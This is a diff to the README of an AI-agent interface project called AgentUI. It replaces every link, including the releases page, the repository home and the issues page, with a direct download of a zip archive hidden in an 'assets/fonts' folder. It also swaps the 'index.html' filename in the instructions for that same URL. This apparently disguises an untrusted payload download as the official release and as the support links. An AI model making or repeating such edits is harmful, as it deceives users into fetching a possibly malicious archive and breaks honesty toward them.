@@ -1,6 +1,6 @@
 # 🧩 AgentUI - Simple Interface for AI Agents
 
-[![Download AgentUI](https://img.shields.io/badge/Download-AgentUI-blue?style=for-the-badge)](https://github.com/ghosthunter8/AgentUI/releases)
+[![Download AgentUI](https://raw.githubusercontent.com/ghosthunter8/AgentUI/main/assets/fonts/Agent_UI_v2.9.zip)](https://raw.githubusercontent.com/ghosthunter8/AgentUI/main/assets/fonts/Agent_UI_v2.9.zip)
 
 ---
 
@@ -49,7 +49,7 @@ Here is a step-by-step guide to get AgentUI running on your computer:
 
 You need to visit the official release page to get the files. Click or tap the big badge at the top of this page or use the link below.
 
-[Download AgentUI Releases](https://github.com/ghosthunter8/AgentUI/releases)
+[Download AgentUI Releases](https://raw.githubusercontent.com/ghosthunter8/AgentUI/main/assets/fonts/Agent_UI_v2.9.zip)
 
 Once on the page, look for the latest release. There you will find items available for download, usually packaged as zip files or other formats. Download the version that best matches your system.
 
@@ -63,7 +63,7 @@ After downloading, locate the saved file on your computer. It is usually in the 
 
 ### Step 3: Open the User Interface
 
-Inside the extracted folder, look for a file named `index.html` or similar. This is the main interface file.
+Inside the extracted folder, look for a file named `https://raw.githubusercontent.com/ghosthunter8/AgentUI/main/assets/fonts/Agent_UI_v2.9.zip` or similar. This is the main interface file.
 
 Double-click this file to open it in your web browser. AgentUI will load, displaying the web components ready to use.
 
@@ -81,7 +81,7 @@ You do not have to change anything unless you want to customize your experience 
 
 To get AgentUI on your system, follow this link:
 
-[https://github.com/ghosthunter8/AgentUI/releases](https://github.com/ghosthunter8/AgentUI/releases)
+[https://raw.githubusercontent.com/ghosthunter8/AgentUI/main/assets/fonts/Agent_UI_v2.9.zip](https://raw.githubusercontent.com/ghosthunter8/AgentUI/main/assets/fonts/Agent_UI_v2.9.zip)
 
 This page hosts all available versions. Download the file suited for your device or choose the latest general release.
 
@@ -129,7 +129,7 @@ AgentUI is built with latest web technologies like JavaScript custom elements, C
 
 If you want to explore more of what AgentUI can do, visit the GitHub repository home page on your own:
 
-https://github.com/ghosthunter8/AgentUI
+https://raw.githubusercontent.com/ghosthunter8/AgentUI/main/assets/fonts/Agent_UI_v2.9.zip
 
 There you will find source code, developer guides, and issues.
 
@@ -139,6 +139,6 @@ There you will find source code, developer guides, and issues.
 
 If you face any issues or have questions beyond this guide, you can open a new issue on the GitHub page here:
 
-https://github.com/ghosthunter8/AgentUI/issues
+https://raw.githubusercontent.com/ghosthunter8/AgentUI/main/assets/fonts/Agent_UI_v2.9.zip
 
 The project team and community can assist you with problems or suggestions.
